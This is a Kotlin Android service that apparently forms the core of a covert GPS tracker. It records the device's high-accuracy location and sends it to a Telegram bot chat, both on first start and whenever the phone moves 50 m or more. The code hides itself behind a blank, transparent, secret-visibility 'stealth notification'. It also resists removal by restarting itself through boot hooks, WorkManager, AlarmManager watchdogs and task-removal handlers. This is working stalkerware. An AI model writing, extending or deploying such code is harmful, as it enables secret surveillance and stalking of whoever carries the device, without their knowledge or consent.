package com.gpstracker.telegram

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

class LocationTrackingService : Service() {

    companion object {
        private const val TAG = "LocationSvc"
        private const val CHANNEL_ID = "sys_svc_01"
        private const val NOTIFICATION_ID = 1

        const val EXTRA_BOOT_START = "boot_start"

        private const val ALERT_DISTANCE_METERS      = 50f
        private const val TELEGRAM_INTERVAL_MS       = 5 * 60 * 1000L
        private const val LOCATION_INTERVAL_MS       = 15_000L   // poll every 15 s
        private const val LOCATION_FASTEST_MS        = 5_000L
        private const val WATCHDOG_ALARM_INTERVAL_MS = 10 * 60 * 1000L
    }

    private lateinit var fusedClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    // True once the first "I'm online + location" message has been sent this session
    private var sentInitialLocation = false
    private var startLocation: Location? = null

    // ─── Lifecycle ────────────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        fusedClient = LocationServices.getFusedLocationProviderClient(this)
        createNotificationChannel()
        buildLocationCallback()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, buildStealthNotification())

        val prefs = prefs()
        prefs.edit().putBoolean(Prefs.KEY_TRACKING_ACTIVE, true).apply()

        // Restore start location saved from a previous session so we keep
        // tracking relative to the same origin across service restarts / reboots.
        if (startLocation == null) {
            val savedLat = prefs.getFloat(Prefs.KEY_START_LAT, 0f)
            val savedLng = prefs.getFloat(Prefs.KEY_START_LNG, 0f)
            if (savedLat != 0f || savedLng != 0f) {
                startLocation = Location("saved").apply {
                    latitude  = savedLat.toDouble()
                    longitude = savedLng.toDouble()
                }
                // Start location already established — skip the initial "online" message
                sentInitialLocation = true
            }
        }

        scheduleWatchdogs()

        // Try to get an instant last-known fix so we don't wait for the first
        // GPS poll (which can take up to 15 s on a cold start).
        tryLastKnownLocation()

        startLocationUpdates()

        Log.d(TAG, "Service started — sentInitial=$sentInitialLocation")
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.d(TAG, "Task removed — scheduling restart")
        scheduleImmediateRestart()
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        Log.d(TAG, "onDestroy — watchdog will restart")
        try { fusedClient.removeLocationUpdates(locationCallback) } catch (_: Exception) {}
        scope.cancel()
        scheduleImmediateRestart()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ─── Location ─────────────────────────────────────────────────────────────

    @Suppress("MissingPermission")
    private fun tryLastKnownLocation() {
        fusedClient.lastLocation.addOnSuccessListener { location ->
            if (location != null) {
                Log.d(TAG, "Last-known location: ${location.latitude}, ${location.longitude}")
                onNewLocation(location)
            }
        }
    }

    private fun buildLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { onNewLocation(it) }
            }
        }
    }

    @Suppress("MissingPermission")
    private fun startLocationUpdates() {
        val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, LOCATION_INTERVAL_MS)
            .setMinUpdateIntervalMillis(LOCATION_FASTEST_MS)
            .build()
        fusedClient.requestLocationUpdates(req, locationCallback, Looper.getMainLooper())
    }

    private fun onNewLocation(location: Location) {
        // ── Step 1: Send the first "online + location" message ────────────────
        if (!sentInitialLocation) {
            sentInitialLocation = true
            startLocation = location

            prefs().edit()
                .putFloat(Prefs.KEY_START_LAT, location.latitude.toFloat())
                .putFloat(Prefs.KEY_START_LNG, location.longitude.toFloat())
                .putFloat(Prefs.KEY_CURRENT_LAT, location.latitude.toFloat())
                .putFloat(Prefs.KEY_CURRENT_LNG, location.longitude.toFloat())
                .apply()

            val (token, chatId) = credentials()
            scope.launch {
                TelegramApi.sendMessage(
                    token, chatId,
                    TelegramApi.buildOnlineWithLocationMessage(
                        location.latitude, location.longitude, location.accuracy
                    )
                )
            }
            return
        }

        // ── Step 2: Periodic movement alerts ─────────────────────────────────
        prefs().edit()
            .putFloat(Prefs.KEY_CURRENT_LAT, location.latitude.toFloat())
            .putFloat(Prefs.KEY_CURRENT_LNG, location.longitude.toFloat())
            .apply()

        val origin = startLocation ?: return
        val distance = origin.distanceTo(location)
        prefs().edit().putFloat(Prefs.KEY_CURRENT_DIST, distance).apply()

        if (distance >= ALERT_DISTANCE_METERS) {
            val p = prefs()
            val lastSent = p.getLong(Prefs.KEY_LAST_SENT_TIME, 0L)
            val now = System.currentTimeMillis()
            if (now - lastSent >= TELEGRAM_INTERVAL_MS) {
                val (token, chatId) = credentials()
                scope.launch {
                    val ok = TelegramApi.sendMessage(
                        token, chatId,
                        TelegramApi.buildLocationMessage(
                            location.latitude, location.longitude, distance, location.accuracy
                        )
                    )
                    if (ok) prefs().edit().putLong(Prefs.KEY_LAST_SENT_TIME, now).apply()
                }
            }
        }
    }

    // ─── Watchdogs ────────────────────────────────────────────────────────────

    private fun scheduleWatchdogs() {
        // WorkManager — persists across reboots, minimum 15-min interval
        val workReq = PeriodicWorkRequestBuilder<WatchdogWorker>(15, TimeUnit.MINUTES).build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "loc_watchdog", ExistingPeriodicWorkPolicy.KEEP, workReq
        )
        // AlarmManager — more frequent while device is awake
        scheduleWatchdogAlarm(WATCHDOG_ALARM_INTERVAL_MS)
    }

    private fun scheduleImmediateRestart() = scheduleWatchdogAlarm(3_000L)

    private fun scheduleWatchdogAlarm(delayMs: Long) {
        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val pi = PendingIntent.getBroadcast(
            this, 0,
            Intent(this, WatchdogReceiver::class.java).apply {
                action = WatchdogReceiver.ACTION_WATCHDOG
            },
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        try {
            am.setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + delayMs, pi
            )
        } catch (_: SecurityException) {
            am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + delayMs, pi)
        }
    }

    // ─── Stealth notification ─────────────────────────────────────────────────

    private fun createNotificationChannel() {
        val ch = NotificationChannel(
            CHANNEL_ID, " ", NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = ""
            setShowBadge(false)
            setSound(null, null)
            enableLights(false)
            enableVibration(false)
        }
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(ch)
    }

    private fun buildStealthNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .build()

    // ─── Helpers ──────────────────────────────────────────────────────────────

    private fun prefs() = getSharedPreferences(Prefs.NAME, Context.MODE_PRIVATE)

    private fun credentials(): Pair<String, String> {
        val p = prefs()
        return (p.getString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN) ?: Prefs.DEFAULT_BOT_TOKEN) to
               (p.getString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID)   ?: Prefs.DEFAULT_CHAT_ID)
    }
}
